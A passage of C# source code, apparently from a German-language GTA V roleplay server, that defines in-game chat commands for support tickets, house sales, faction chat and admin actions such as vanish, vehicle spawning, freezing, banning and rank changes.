                    bool invisible = client.GetSharedData("PLAYER_INVISIBLE");
                    dbPlayer.SendNotification("Du hast dich " + (!invisible ? "unsichtbar" : "sichtbar") + " gemacht.", "black", 3500, "ADMIN");
                    client.SetSharedData("PLAYER_INVISIBLE", !invisible);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION VANISH] " + ex.Message);
                    Logger.Print("[EXCEPTION VANISH] " + ex.StackTrace);
                }
            }, "v", 92, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    string car = args[1];
                    Vehicle vehicle = NAPI.Vehicle.CreateVehicle(NAPI.Util.GetHashKey(car), client.Position, 0.0f, 0, 0, "", 255, false, true, client.Dimension);
                    client.SetIntoVehicle(vehicle, -1);
                    vehicle.CustomPrimaryColor = dbPlayer.Adminrank.RGB;
                    vehicle.CustomSecondaryColor = dbPlayer.Adminrank.RGB;
                    vehicle.NumberPlate = ("ADMIN");
                    dbPlayer.SendNotification("Du hast das Fahrzeug " + car + " erfolgreich gespawnt.", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION VEH] " + ex.Message);
                    Logger.Print("[EXCEPTION VEH] " + ex.StackTrace);
                }
            }, "veh", 96, 1));


            commandList.Add(new Command(delegate (DbPlayer dbPlayer, string[] args)
            {
                if (dbPlayer.HasData("IN_HOUSE"))
                {
                    int num5 = dbPlayer.GetData("IN_HOUSE");
                    if (num5 != 0)
                    {
                        House houseById = HouseModule.getHouseById(num5);
                        if (houseById.OwnerId != dbPlayer.Id && houseById.TenantsIds.Contains(dbPlayer.Id))
                        {
                            dbPlayer.Position = houseById.Entrance;
                            HouseModule.houses.Remove(houseById);
                            houseById.TenantsIds.Remove(dbPlayer.Id);
                            if (houseById.TenantPrices.ContainsKey(dbPlayer.Id))
                            {
                                houseById.TenantPrices.Remove(dbPlayer.Id);
                            }
                            HouseModule.houses.Add(houseById);
                            MySqlQuery mySqlQuery5 = new MySqlQuery("UPDATE houses SET TenantsId = @tenantsid, TenantPrices = @tenantprices WHERE Id = @id");
                            mySqlQuery5.AddParameter("@tenantsid", NAPI.Util.ToJson((object)houseById.TenantsIds));
                            mySqlQuery5.AddParameter("@tenantprices", NAPI.Util.ToJson((object)houseById.TenantPrices));
                            mySqlQuery5.AddParameter("@id", houseById.Id);
                            MySqlHandler.ExecuteSync(mySqlQuery5);
                            dbPlayer.SendNotification("Du hast den Mietvertrag verlassen!", "black", 3500);
                        }
                    }
                    else
                    {
                        dbPlayer.SendNotification("Du befindest dich nicht in einem Haus!", "black", 3500);
                    }
                }
                else
                {
                    dbPlayer.SendNotification("Du befindest dich nicht in einem Haus!", "black", 3500);
                }
            }, "cancelrental", 0, 0));
            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                if (args[1] == "cancel")
                {
                    TabletModule.Tickets.RemoveAll((Ticket ticket) => ticket.Creator == dbPlayer.Name);
                    dbPlayer.SendNotification("Du hast dein Ticket geschlossen!", "black", 3500);
                    return;
                }

                if (TabletModule.Tickets.Count >= 99)
                {
                    dbPlayer.SendNotification("Es sind bereits zu viele Tickets offen.", "black", 3500);
                    return;
                }


                if (TabletModule.Tickets.FirstOrDefault((Ticket ticket2) => ticket2.Creator == dbPlayer.Name) != null)
                {
                    dbPlayer.SendNotification("Du hast bereits ein offenes Ticket!", "black", 3500);
                    return;
                }
                if (String.Join(" ", args).Replace("support ", "").Length > 100)
                {
                    dbPlayer.SendNotification("Grund zu lang!", "black", 3500);
                    return;
                }

                var ticket = new Ticket
                {
                    Id = (int)new Random().Next(10000, 99999),
                    Created = DateTime.Now,
                    Creator = dbPlayer.Name,
                    Text = String.Join(" ", args).Replace("support ", "")
                };

                dbPlayer.SendNotification("Deine Nachricht wurde an die Administration gesendet! Benutze /support cancel um dein Ticket zu schließen!", "black", 3500);

                PlayerHandler.GetAdminPlayers().ForEach((DbPlayer dbPlayer2) =>
                {
                    if (dbPlayer2.HasData("disablenc")) return;
                    if (TabletModule.Tickets.Count >= 15)
                    {
                        dbPlayer2.SendNotification("Es sind " + TabletModule.Tickets.Count + " Support Tickets offen!", "black", 3500);
                        if (dbPlayer2.HasData("PLAYER_ADUTY") && dbPlayer2.GetData("PLAYER_ADUTY") == true)
                            dbPlayer2.SendNotification(dbPlayer.Name + ": " + String.Join(" ", args).Replace("support ", "") + "", "black", 3500);
                    }
                    else
                    {
                        if (dbPlayer2.HasData("PLAYER_ADUTY") && dbPlayer2.GetData("PLAYER_ADUTY") == true)
                            dbPlayer2.SendNotification(dbPlayer.Name + ": " + String.Join(" ", args).Replace("support ", "") + "", "black", 3500);
                    }
                });
                TabletModule.Tickets.Add(ticket);
            }, "support", 0, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer.HasData("IN_HOUSE"))
                {
                    int houseId = dbPlayer.GetData("IN_HOUSE");
                    if (houseId != 0)
                    {
                        House house = HouseModule.getHouseById(houseId);
                        if (house.OwnerId != dbPlayer.Id)
                        {
                            dbPlayer.SendNotification("Das ist nicht dein Haus!", "black", 3500);
                            return;
                        }
                        dbPlayer.Position = house.Entrance;

                        HouseModule.houses.Remove(house);
                        house.OwnerId = 0;
                        dbPlayer.Dimension = 0;
                        HouseModule.houses.Add(house);
                        dbPlayer.addMoney(house.Price / 2);
                        MySqlQuery mySqlQuery = new MySqlQuery("UPDATE houses SET OwnerId = @ownerid WHERE Id = @id");
                        mySqlQuery.AddParameter("@ownerid", 0);
                        mySqlQuery.AddParameter("@id", house.Id);
                        MySqlHandler.ExecuteSync(mySqlQuery);
                        dbPlayer.SendNotification("Du hast dein Haus verkauft! (" + house.Price / 2 + ")", "black", 3500);
                    }
                    else
                    {
                        dbPlayer.SendNotification("Du befindest dich nicht in einem Haus!", "black", 3500);
                    }
                }
                else
                {
                    dbPlayer.SendNotification("Du befindest dich nicht in einem Haus!", "black", 3500);
                }
            }, "sellhouse", 0, 0));




            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (String.Join(" ", args).ToLower().Contains("discord.gg/") || String.Join(" ", args).ToLower().Contains("hs") || String.Join(" ", args).ToLower().Contains("esel"))
                {
                    dbPlayer.SendNotification("Blacklisted Word", "black", 3500);
                    
                    dbPlayer.Client.Kick();
                    return;
                }
            




            NAPI.ClientEvent.TriggerClientEventInRange(dbPlayer.Client.Position, 100.0f, "sendPlayerNotification", String.Join(" ", args).Replace("ooc ", ""), "black", 3500, "OOC - (" + dbPlayer.Name + ")", "");
            }, "ooc", 0, 1));



            commandList.Add(new Command((dbPlayer, args) =>
            {
                PlayerHandler.GetAdminPlayers().ForEach((DbPlayer dbPlayer2) =>
                {
                    if (dbPlayer2.HasData("disablenc")) return;

                    Adminrank adminranks = dbPlayer2.Adminrank;

                    if (adminranks.Permission >= 91)
                        dbPlayer2.SendNotification(String.Join(" ", args).Replace("tc", ""), "#0972c1", 6000, "TEAMCHAT - (" + dbPlayer.Name + ")");
                });
            }, "tc", 91, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                PlayerHandler.GetPlayers().ForEach((DbPlayer dbPlayer2) =>
                {
                    Faction Fraktion = dbPlayer2.Faction;

                    if (Fraktion.Id == 0)
                    {
                        return;
                    }
                    if (Fraktion.Id == dbPlayer.Faction.Id)
                        dbPlayer2.SendNotification(String.Join(" ", args).Replace("fc", ""), "aqua", 6000, "FrakChat - (" + dbPlayer.Name + " - " + dbPlayer.Factionrank + ")");
                });
            }, "fc", 0, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                dbPlayer.SendNotification("du wurdest zum Marker Teleportiert!", "black", 3500);
                dbPlayer.Client.TriggerEvent("TeleportToWayPoint");
            }, "tpm", 0, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer.HasData("disablenc"))
                {
                    dbPlayer.SendNotification("Team Chat aktiviert", "black", 3500);
                    dbPlayer.SendNotification("Reports aktiviert", "black", 3500);
                    dbPlayer.SendNotification("Anticheat aktiviert", "black", 3500);
                    dbPlayer.ResetData("disablenc");
                }
                else
                {
                    dbPlayer.SendNotification("Team Chat deaktivert", "black", 3500);
                    dbPlayer.SendNotification("Reports deaktivert", "black", 3500);
                    dbPlayer.SendNotification("Anticheat deaktiviert", "black", 3500);
                    dbPlayer.SetData("disablenc", true);
                }
            }, "notify", 94, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                Adminrank adminrank = dbPlayer.Adminrank;
                Adminrank adminranks = dbPlayer2.Adminrank;

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                    if (adminrank.Permission <= adminranks.Permission)
                    {
                        dbPlayer.SendNotification("Das kannst du nicht tun, da der Teamler mehr Rechte als du hat oder die gleichen!", "black", 3500);
                        return;
                    }
                    else
                    {
                        BanModule.BanIdentifier(target.Name, String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), target.Name);

                        MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @username");
                        mySqlQuery.AddParameter("@username", target.Name);
                        MySqlResult mySqlResult = MySqlHandler.GetQuery(mySqlQuery);

                        MySqlDataReader reader = mySqlResult.Reader;

                        if (reader.HasRows)
                        {
                            reader.Read();
                            BanModule.BanIdentifier(reader.GetString("Social"), String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), target.Name);
                        }

                        reader.Dispose();
                        mySqlResult.Connection.Dispose();

                        BanModule.BanIdentifier(target.Name, String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), target.Name);
                        dbPlayer.SendNotification("Spieler gebannt!", "black", 3500);
                        dbPlayer2.TriggerEvent("openWindow", new object[2]
{
                                    "Bann",
                                    "{\"name\":\"" + dbPlayer2.Name + "\"}"
});
                        dbPlayer2.Client.Kick();
                        Notification.SendGlobalNotification(dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " hat " + target.Name + " von der Community ausgeschlossen!", 10000, "#0972c1", Notification.icon.warn);
                        WebhookSender.SendMessage("Spieler wird gebannt", "Der Spieler " + dbPlayer.Name + " hat den Spieler " + target.Name + " gebannt. Grund: " + String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), Webhooks.banlogs, "Ban");
                    }
                else
                {
                    Client client = dbPlayer2.Client;
                    dbPlayer2.BanPlayer(dbPlayer.Adminrank.Name + " " + dbPlayer.Name, String.Join(" ", args).Replace("xcm " + args[1] + " ", ""));
                    dbPlayer.SendNotification("Spieler gebannt!", "black", 3500);
                    client.TriggerEvent("openWindow", new object[2]
{
                                    "Bann",
                                    "{\"name\":\"" + dbPlayer2.Name + "\"}"
});
                    dbPlayer2.Client.Kick();
                    Notification.SendGlobalNotification(dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " hat " + target.Name + " vom Server gekickt! Grund: " + String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), 10000, "#0972c1", Notification.icon.warn);
                    WebhookSender.SendMessage("Spieler wird gebannt", "Der Spieler " + dbPlayer.Name + " hat den Spieler " + target.Name + " gebannt. Grund: " + String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), Webhooks.banlogs, "Ban");
                }
            }, "xcm", 94, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.SocialClubName.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                Adminrank adminrank = dbPlayer.Adminrank;
                Adminrank adminranks = dbPlayer2.Adminrank;

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                    if (adminrank.Permission <= adminranks.Permission)
                    {
                        dbPlayer.SendNotification("Das kannst du nicht tun, da der Teamler mehr Rechte als du hat oder die gleichen!", "black", 3500);
                        return;
                    }
                    else
                    {
                        BanModule.BanIdentifier(target.Name, String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), target.Name);

                        MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @username");
                        mySqlQuery.AddParameter("@username", target.Name);
                        MySqlResult mySqlResult = MySqlHandler.GetQuery(mySqlQuery);

                        MySqlDataReader reader = mySqlResult.Reader;

                        if (reader.HasRows)
                        {
                            reader.Read();
                            BanModule.BanIdentifier(reader.GetString("Social"), String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), target.Name);
                        }

                        reader.Dispose();
                        mySqlResult.Connection.Dispose();

                        BanModule.BanIdentifier(target.Name, String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), target.Name);
                        dbPlayer.SendNotification("Spieler gebannt!", "black", 3500);
                        dbPlayer2.TriggerEvent("openWindow", new object[2]
{
                                    "Bann",
                                    "{\"name\":\"" + dbPlayer2.Name + "\"}"
});
                        dbPlayer2.Client.Kick();
                        Notification.SendGlobalNotification(dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " hat " + target.Name + " von der Community ausgeschlossen!", 10000, "#0972c1", Notification.icon.warn);
                        WebhookSender.SendMessage("Spieler wird gebannt", "Der Spieler " + dbPlayer.Name + " hat den Spieler " + target.Name + " gebannt. Grund: " + String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), Webhooks.banlogs, "Ban");
                    }
                else
                {
                    Client client = dbPlayer2.Client;
                    dbPlayer2.BanPlayer(dbPlayer.Adminrank.Name + " " + dbPlayer.Name, String.Join(" ", args).Replace("xcm " + args[1] + " ", ""));
                    dbPlayer.SendNotification("Spieler gebannt!", "black", 3500);
                    client.TriggerEvent("openWindow", new object[2]
{
                                    "Bann",
                                    "{\"name\":\"" + dbPlayer2.Name + "\"}"
});
                    dbPlayer2.Client.Kick();
                    Notification.SendGlobalNotification(dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " hat " + target.Name + " vom Server gekickt! Grund: " + String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), 10000, "#0972c1", Notification.icon.warn);
                    WebhookSender.SendMessage("Spieler wird gebannt", "Der Spieler " + dbPlayer.Name + " hat den Spieler " + target.Name + " gebannt. Grund: " + String.Join(" ", args).Replace("xcm " + args[1] + " ", ""), Webhooks.banlogs, "Ban");
                }
            }, "xcmsc", 94, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string frak = args[2];
                string rang = args[3];


                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;

                }
                if (Int64.Parse(rang) > 12)
                {
                    dbPlayer.SendNotification("Du kannst nur Ränge bis 12 vergeben!", "black", 3500);
                    return;
                }
                int fraktion2 = dbPlayer2.Faction.Id;
                MySqlQuery mySqlQuery = new MySqlQuery($"SELECT COUNT(*) as Anzahl FROM accounts WHERE Fraktion = '{fraktion2}'");
                // MySqlResult mySqlReaderCon = MySqlHandler.GetQuery(mySqlQuery);
                MySqlResult result = MySqlHandler.GetQuery(mySqlQuery);
                try
                {
                    if (result.Reader.HasRows)
                    {
                        result.Reader.Read();
                        if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                        {
                            Client client = dbPlayer2.Client;
                            Adminrank adminrank = dbPlayer.Adminrank;
                            Faction fraktion = FactionModule.getFactionById(Convert.ToInt32(frak));
                            dbPlayer2.SendNotification("Deine Fraktion wurde administrativ geändert! (" + fraktion.Name + ")", "black", 3500);
                            dbPlayer.SendNotification("Du hast dem Spieler " + name + " die Fraktion " + fraktion.Name + " und den Rang " + rang + " gesetzt!", "black", 3500);

                            dbPlayer2.SetAttribute("Fraktion", frak);
                            dbPlayer2.SetAttribute("Fraktionrank", rang);

                            dbPlayer2.TriggerEvent("updateTeamId", frak);
                            dbPlayer2.TriggerEvent("updateTeamRank", rang);
                            dbPlayer2.TriggerEvent("updateJob", fraktion.Name);
                            dbPlayer2.Faction = fraktion;
                            dbPlayer2.Factionrank = 0;
                            dbPlayer2.RefreshData(dbPlayer2);
                        }
                        result.Connection.Dispose();
                    }
                    //result.Connection.Dispose();//ggf crash
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION addPlayer] " + ex.Message);
                    Logger.Print("[EXCEPTION addPlayer] " + ex.StackTrace);
                }
            }, "setfrak", 96, 3));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string frak = args[2];
                string rang = args[3];


                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;

                }
                //if (Int64.Parse(rang) > 12)
                //{
                //dbPlayer.SendNotification("Du kannst nur Ränge bis 12 vergeben!", "black", 3500);
                //return;
                //}
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    Client client = dbPlayer2.Client;
                    Adminrank adminrank = dbPlayer.Adminrank;
                    Faction fraktion = FactionModule.getFactionById(Convert.ToInt32(frak));
                    dbPlayer2.SendNotification("Deine Fraktion wurde administrativ geändert! (" + fraktion.Name + ")", "black", 3500);
                    dbPlayer.SendNotification("Du hast dem Spieler " + name + " die Fraktion " + fraktion.Name + " und den Rang " + rang + " gesetzt!", "black", 3500);

                    dbPlayer2.SetAttribute("Fraktion", frak);
                    dbPlayer2.SetAttribute("Fraktionrank", rang);


                    dbPlayer2.TriggerEvent("updateTeamId", frak);
                    dbPlayer2.TriggerEvent("updateTeamRank", rang);
                    dbPlayer2.TriggerEvent("updateJob", fraktion.Name);
                    dbPlayer2.Faction = fraktion;
                    dbPlayer2.Factionrank = 0;
                    dbPlayer2.RefreshData(dbPlayer2);

                    //result.Connection.Dispose();//ggf crash
                }
            }, "frakset", 96, 3));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string fahrzeug = args[2];
                string nummernschild = args[3];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    int id = new Random().Next(10000, 99999999);
                    Adminrank adminrank = dbPlayer.Adminrank;
                    dbPlayer2.SendNotification("Dir wurde das Fahrzeug " + fahrzeug + " mit dem Kennzeichen " + nummernschild + " gesetzt!", "black", 3500);

                    dbPlayer.SendNotification("Du hast " + name + " das Fahrzeug " + fahrzeug + " mit dem Kennzeichen " + nummernschild + " gesetzt!", "black", 3500);
                    List<int> list = new List<int>();
                    list.Add(dbPlayer2.Id);
                    MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO `vehicles` (`Id`, `Vehiclehash`, `Parked`, `OwnerId`, `Carkeys`, `Plate`) VALUES (@id, @vehiclehash, @parked, @ownerid, @carkeys, @plate)");
                    mySqlQuery.AddParameter("@vehiclehash", fahrzeug);
                    mySqlQuery.AddParameter("@parked", 1);
                    mySqlQuery.AddParameter("@ownerid", dbPlayer2.Id);
                    mySqlQuery.AddParameter("@carkeys", NAPI.Util.ToJson(list));
                    mySqlQuery.AddParameter("@plate", nummernschild);
                    mySqlQuery.AddParameter("@id", id);
                    MySqlHandler.ExecuteSync(mySqlQuery);
                }
            }, "givecar", 97, 3));


            commandList.Add(new Command(async (dbPlayer, args) =>
            {
                string name = args[1];
                string reason = "XCM";

                MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @username LIMIT 1");
                mySqlQuery.AddParameter("@username", name);
                MySqlResult mySqlResult = MySqlHandler.GetQuery(mySqlQuery);
                MySqlDataReader reader = mySqlResult.Reader;
                try
                {
                    if (reader.HasRows)
                    {
                        reader.Read();
                        BanModule.BanIdentifier(name, reason, name);
                        BanModule.BanIdentifier(reader.GetString("Social"), reason, name);
                        dbPlayer.SendNotification("Du hast den Spieler " + name + " offline Gebannt!", "black", 3500);
                    }
                    else
                    {
                        dbPlayer.SendNotification("Spieler wurde nicht gefunden!", "black", 3500);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                finally
                {
                    await reader.DisposeAsync();
                    await mySqlResult.Connection.DisposeAsync();
                }
            }, "offxcm", 94, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string kat = args[2];
                string com = args[3];
                string draw = args[4];
                string tex = args[5];


                int id = new Random().Next(10000, 99999999);
                dbPlayer.SendNotification("Hinzugefügt!", "black", 3500);
                MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO `adminclothes` (`Name`, `Category`, `Component`, `Drawable`, `Texture`, `Id`) VALUES (@name, @category, @component, @drawable, @texture, @id)");
                mySqlQuery.AddParameter("@name", name);
                mySqlQuery.AddParameter("@category", kat);
                mySqlQuery.AddParameter("@component", com);
                mySqlQuery.AddParameter("@drawable", draw);
                mySqlQuery.AddParameter("@texture", tex);
                mySqlQuery.AddParameter("@id", id);
                MySqlHandler.ExecuteSync(mySqlQuery);
            }, "addcloth", 96, 5));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string frakid = args[1];
                {
                    Adminrank adminrank = dbPlayer.Adminrank;
                    Faction fraktion = FactionModule.getFactionById(Convert.ToInt32(frakid));
                    dbPlayer.SendNotification("Die ID " + frakid + " gehört zu der Fraktion: " + fraktion.Name + "", "black", 3500);
                }
            }, "frakinfo", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    if ((int)dbPlayer2.GetAttributeInt("warns") == 0)
                    {
                        dbPlayer2.SendNotification("Das geht nicht, da der Spieler keine Warns hat!", "black", 3500);
                        return;
                    }
                    else
                        dbPlayer2.SetAttribute("warns", (int)dbPlayer2.GetAttributeInt("warns") - 1);
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast den Spieler " + target.Name + " einen Warn entfernt!", "black", 3500);
                    dbPlayer2.SendNotification("Dir wurde ein von " + dbPlayer.Name + " Warn entfernt!", "black", 3500);
                }
            }, "delwarn", 91, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    Client client = dbPlayer2.Client;
                    Adminrank adminrank = dbPlayer.Adminrank;



                    dbPlayer2.disableAllPlayerActions(true);
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast " + dbPlayer2.Name + " geFreezed.", "black", 3500);
                    dbPlayer2.SendNotification("Du wurdest von " + dbPlayer.Name + " geFreezed!", "black", 3500);
                }
            }, "freeze", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    Client client = dbPlayer2.Client;
                    Adminrank adminrank = dbPlayer.Adminrank;


                    dbPlayer2.disableAllPlayerActions(false);
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast " + name + " geFreezed.", "black", 3500);
                    dbPlayer2.SendNotification("Sie wurden von " + dbPlayer.Name + " entFreezed!", "black", 3500);
                }
            }, "unfreeze", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                int fraktion1 = FactionModule.factionList.Count;

                {
                    Faction fraktion = FactionModule.getFactionById(Convert.ToInt32(fraktion1));
                    if (fraktion.Name == "Zivilist")
                    {
                        return;
                    }
                    if (fraktion.Name != "Zivilist")
                    {
                        dbPlayer.SendNotification("Fraktionen: " + FactionModule.factionList.Count, "black", 3500);

                    }
                }
            }, "fraks", 91, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                int rang = 0;
                bool rang2 = int.TryParse(args[2], out rang);

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;

                    Adminrank adminrank = dbPlayer.Adminrank;
                    Adminrank adminranks = dbPlayer2.Adminrank;
                    if (adminrank.Permission <= rang)
                    {
                        dbPlayer.SendNotification("Deine Rechte reichen dafür nicht aus!", "black", 3500);
                        return;
                    }
                    if (adminrank.Permission <= adminranks.Permission)
                    {
                        dbPlayer.SendNotification("Das kannst du nicht tun, da der Teamler mehr Rechte als du hat oder die gleichen!", "black", 3500);
                        return;
                    }

                    dbPlayer2.SetAttribute("Adminrank", rang);
                    dbPlayer2.RefreshData(dbPlayer2);
                    adminranks = dbPlayer2.Adminrank;
                    Adminrank newadminrank = AdminrankModule.getAdminrank(rang);
                    dbPlayer.SendNotification("Du hast " + name + " den Rang " + newadminrank.Name + " gesetzt!", "black", 3500);
                    dbPlayer2.SendNotification("Dein Team Rang wurde verändert (" + newadminrank.Name + ")", "black", 3500);
                }
            }, "setperm", 98, 2));


            commandList.Add(new Command(delegate (DbPlayer dbPlayer, string[] args)
            {
                Client client2 = dbPlayer.Client;
                StringBuilder stringBuilder = new StringBuilder();
                try
                {
                    {
                        string name = args[1];
                        DbPlayer player2 = PlayerHandler.GetPlayer(name);
                        if (player2 == null || !player2.IsValid(ignorelogin: true))
                        {
                            dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                        }
                        else
                        {
                            player2.RefreshData(player2);
                            player2.SetAttribute("Donator", 1);
                            dbPlayer.SendNotification("Donator gesetzt!", "black", 3500);
                        }
                    }
                }
                catch (Exception ex2)
                {
                    Logger.Print("[EXCEPTION setmedic] " + ex2.Message);
                    Logger.Print("[EXCEPTION setmedic] " + ex2.StackTrace);
                }
            }, "setdonator", 98, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string telefonnrm = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE vehicles SET OwnerId = @neued WHERE OwnerId = @username");
                    mySqlQuery.AddParameter("@username", name);
                    mySqlQuery.AddParameter("@neued", telefonnrm);
                    MySqlHandler.ExecuteSync(mySqlQuery);
                    dbPlayer2.SetAttribute("Id", telefonnrm);

                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast dem Spieler " + name + " die Telefonnummer " + telefonnrm + " gesetzt!", "black", 3500);
                    dbPlayer2.SendNotification("Deine Telefonnummer wurde geändert! (" + telefonnrm + ")", "black", 3500);
                }
            }, "changenumber", 100, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string name2 = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.SetAttribute("Username", name2);
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast dem Spieler " + name + " den Namen " + name2 + " gesetzt!", "black", 3500);
                    dbPlayer2.SendNotification("Dein Name wurde geändert! (" + name2 + ")", "black", 3500);
                }
            }, "rename", 96, 2));

            commandList.Add(new Command(async (dbPlayer, args) =>
            {
                string name = args[1];
                string name2 = args[2];

                MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @username LIMIT 1");
                mySqlQuery.AddParameter("@username", name);
                MySqlResult mySqlResult = MySqlHandler.GetQuery(mySqlQuery);
                MySqlDataReader reader = mySqlResult.Reader;
                try
                {
                    if (reader.HasRows)
                    {
                        reader.Read();
                        MySqlQuery mySqlQuery2 = new MySqlQuery("UPDATE accounts SET Social = @social WHERE Username = @username");
                        mySqlQuery2.AddParameter("@social", name2);
                        mySqlQuery2.AddParameter("@username", name);
                        MySqlHandler.ExecuteSync(mySqlQuery2);
                        dbPlayer.SendNotification("Du hast " + name + " den Social Name auf " + name2 + " gesetzt!", "black", 3500);
                    }
                    else
                    {
                        dbPlayer.SendNotification("Spieler wurde nicht gefunden!", "black", 3500);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                finally
                {
                    await reader.DisposeAsync();
                    await mySqlResult.Connection.DisposeAsync();
                }
            }, "changesocial", 96, 2));

            commandList.Add(new Command(async (dbPlayer, args) =>
            {
                string name = args[1];
